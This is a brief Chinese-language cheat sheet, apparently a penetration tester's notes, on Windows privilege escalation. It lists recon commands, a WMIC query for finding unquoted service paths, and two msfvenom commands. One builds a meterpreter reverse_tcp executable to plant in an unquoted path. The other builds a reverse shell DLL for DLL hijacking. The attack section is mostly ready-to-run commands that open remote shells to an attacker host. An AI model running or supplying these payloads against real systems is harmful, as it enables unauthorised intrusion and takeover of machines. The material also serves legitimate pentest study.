# Information Gathering

- 查询目前操作系统版本
  - `systeminfo`
- 查询当前进程
  - `tasklist`
- 查询已开启的端口和进程
  - `netstat -tulpn`

# Escalation Methodology

- 不带引号的文件路径
  - 原理：当win可执行文件运行时：如果给出路径+引号包含，正常执行；如果仅给出引号，执行第一个空格前的路径。
  - 通过`WMIC`找到这些错误配置。
    - `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """`
  - 利用：如果路径没有引号，可以构造与第一个名称相同的恶意二进制文件，当服务尝试执行包含空格的路径时则会将其执行。
    - `msfvenom -p windows/meterpreter/reverse_tcp lhost=X lport=Y -f exe -o C:\Example\Sub.exe`
- DLL劫持
  - 原理：当输入表中只包含DDL名而没有路径名时，程序会先尝试从当前所在目录加载DLL，如果没有找到，则在win系统目录中查找，最后是在环境变量中查找。
  - 利用：伪造同名的DLL放到当前目录下，当原程序调用原函数时就会调用伪造的DLL。
    - `msfvenom -a x64 -p windows/x64/shell_reverse_tcp -lhost=X -lport=Y -f dll > a.dll`